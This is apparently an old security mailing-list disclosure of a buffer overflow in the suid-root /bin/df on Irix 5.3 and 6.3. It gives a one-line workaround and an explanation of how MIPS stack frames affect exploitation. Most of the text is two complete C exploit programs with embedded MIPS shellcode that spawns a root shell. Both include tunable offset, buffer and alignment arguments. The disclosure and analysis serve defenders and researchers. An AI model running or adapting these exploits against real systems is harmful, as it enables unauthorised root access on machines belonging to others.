There appears to be a buffer overflow in /bin/df on Irix 5.3, 6.2 and 6.3.
/bin/df is installed suid root and hence root access is achievable for
local users.

The version of 'df' which comes with Irix 6.2, whilst having the buffer
overflow problem, is not vulnerable to this exploit as it is compiled as
a 64bit N32 object and it is virtually impossible to exploit buffer
overflows in such programs.

The temporary fix: chmod u-s /bin/df

This only appears to affect the '-f' flag which I doubt anyone ever
uses.

The exploit code included has been tested on the following:

R3000 Indigo (Irix 5.3)
R4400 Indy (Irix 5.3)
R5000 O2 (Irix 6.3)

Compile with either gcc or cc. Note that you should specify one of
'-mips3', '-mips4' or '-n32' to compile on an O2. The default compile
options result in a binary which exhibits weird cache coherency problems
and rarely works.

-------------------- cut here ----------------------------

/* /bin/df buffer overflow exploit by DCRH */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      1504
#define EXTRA           700
#define OFFSET          0x200
#define IRIX_NOP        0x03e0f825    /* move $ra,$ra */

#define u_long unsigned


u_long get_sp_code[] = {
    0x03a01025,         /* move $v0,$sp         */
    0x03e00008,         /* jr $ra               */
    0x00000000,         /* nop                  */
};

u_long irix_shellcode[] = {
    0x24041234,         /* li $4,0x1234         */
    0x2084edcc,         /* sub $4,0x1234        */
    0x0491fffe,         /* bgezal $4,pc-4       */
    0x03bd302a,         /* sgt $6,$sp,$sp       */
    0x23e4012c,         /* addi $4,$31,264+36   */
    0xa086feff,         /* sb $6,-264+7($4)     */
    0x2084fef8,         /* sub $4,264           */
    0x20850110,         /* addi $5,$4,264+8     */
    0xaca4fef8,         /* sw $4,-264($5)       */
    0xaca6fefc,         /* sw $4,-260($5)       */
    0x20a5fef8,         /* sub $5, 264          */
    0x240203f3,         /* li $v0,1011          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x2f62696e,         /* "/bin"               */
    0x2f7368ff,         /* "/sh"                */
};

char buf[BUF_LENGTH + EXTRA + 8];

void main(int argc, char **argv)
{
    char *env[] = {NULL};
    u_long targ_addr, stack;
    u_long *long_p;
    int i, code_length = strlen((char *)irix_shellcode)+1;
    u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;

    stack = get_sp();

    long_p =(u_long *)  buf;
    targ_addr = stack + OFFSET;

    if (argc > 1)
        targ_addr += atoi(argv[1]) * 4;

    while ((targ_addr & 0xff000000) == 0 ||
           (targ_addr & 0x00ff0000) == 0 ||
           (targ_addr & 0x0000ff00) == 0 ||
           (targ_addr & 0x000000ff) == 0)
        targ_addr += 4;

    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = IRIX_NOP;

    for (i = 0; i < code_length/sizeof(u_long); i++)
        *long_p++ = irix_shellcode[i];

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = (targ_addr << 16) | (targ_addr >> 16);

    *long_p = 0;

    printf("stack = 0x%x, targ_addr = 0x%x\n", stack, targ_addr);

    execle("/bin/df", "df", &buf[3], 0, env);
    perror("execl failed");
}



=============================================================================



First, few notes about how buffer overflows can be exploited on Irix for
those unfamiliar with the architecture.  First of all, Irix is running on
MIPS, and MIPS is a classic RISK CPU.  So there's no RET instruction, and
return address of a subroutine doesn't have to be stored on the stack at
all.  In fact, for non-leaf functions (i.e. those that don't call any
subroutines themselves) it's not stored.  For leaf procedures, however,
compiler generates standard prolog/epilog that puts return address and
"frame pointer" ($gp register) on stack and restores it from there.
However, automatic variables are placed on stack _above_ them, so typical
stack entry for sub1 called from sub0 looks like

sub0 stack top (high memory addresses)
sub0 automatic vars
$ra (return address stored)
$gp
sub0 stack bottom/sub1 stack top
sub1 automatic vars
$ra
$gp
sub1 stack bottom (low memory addresses)

(this is assuming sub1 is leaf).  Anyway, it's clear that by overflowing
automatic array one can't reach the stored return address on the current
subroutine.  The parent's stack can be successfully smashed, though.
There're still more problems, however (this part is reworded explanation
from the author of the exploit).  If you go for saved $ra, you have to smash
saved $gp on the way.  In cc-generated code, though, a code sequence similar
to below is often found:

lw      $gp,24($sp)
lw      $t9,-32412($gp)
jalr    $t9

offset is different in each case, of course.  This happens before subroutine
returns, so if $gp has wrong value, it has no chance of ever returning.  So
one actually has to target $gp and supply the right value which after
subtracting the offset points to the code location somewhere in argv or
envp.   This may sometimes be difficult to achieve, especially on 5.3,
because of "no zero bytes" restriction.

There's also alignment issue: shell code should be perfectly aligned on word
(32 bit, in 32 bit mode) boundary, so in addition to finding right value for
$gp one has to try 4 different values for alignment.

So buffer overflows on Irix are not as trivial to exploit as say on x86, but
still it's perfectly possible, and I strongly suspect that Irix will as
usually compensate for that by having numerous potential overflows in each
and every suid binary.

----- df.c --------------------------------------------------------------------
#include <stdlib.h>
#include <fcntl.h>

#define BUFSIZE 2061
#define OFFS 800
#define ADDRS 2
#define ALIGN 0

void run(unsigned char *buf) {

  execl("/usr/sbin/df", "df", buf, NULL);
  printf("execl failed\n");
}

char asmcode[]="\x3c\x18\x2f\x62\x37\x18\x69\x6e\x3c\x19\x2f\x73\x37\x39\x68\x2e\xaf\xb8\xff\xf8\xaf\xb9\xff\xfc\xa3\xa0\xff\xff\x27\xa4\xff\xf8\x27\xa5\xff\xf0\x01\x60\x30\x24\xaf\xa4\xff\xf0\xaf\xa0\xff\xf4\x24\x02\x04\x23\x02\x04\x8d\x0c";
char nop[]="\x24\x0f\x12\x34";

unsigned long get_sp(void) {
__asm__("or     $2,$sp,$0");
}

/* this align stuff sux - i do know. */
main(int argc, char *argv[]) {
  char *buf, *ptr, addr[8];
  int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;
  int i, noplen=strlen(nop);

  if (argc >1) bufsize=atoi(argv[1]);
  if (argc >2) offs=atoi(argv[2]);
  if (argc >3) addrs=atoi(argv[3]);
  if (argc >4) align=atoi(argv[4]);

  if (bufsize<strlen(asmcode)) {
    printf("bufsize too small, code is %d bytes long\n", strlen(asmcode));
    exit(1);
  }
  if ((buf=malloc(bufsize+ADDRS<<2+noplen+1))==NULL) {
    printf("Can't malloc\n");
    exit(1);
  }
  *(int *)addr=get_sp()+offs;
  printf("address - %p\n", *(int *)addr);

  strcpy(buf, nop);
  ptr=buf+noplen;
  buf+=noplen-bufsize % noplen;
  bufsize-=bufsize % noplen;

  for (i=0; i<bufsize; i++)
    *ptr++=nop[i % noplen];
  memcpy(ptr-strlen(asmcode), asmcode, strlen(asmcode));
    memcpy(ptr, nop, strlen(nop));
    ptr+=align;
  for (i=0; i<addrs<<2; i++)
    *ptr++=addr[i % sizeof(int)];
  *ptr=0;
  printf("total buf len - %d\n", strlen(buf));

  run(buf);
}
--- end of df.c ---------------------------------------------------------------
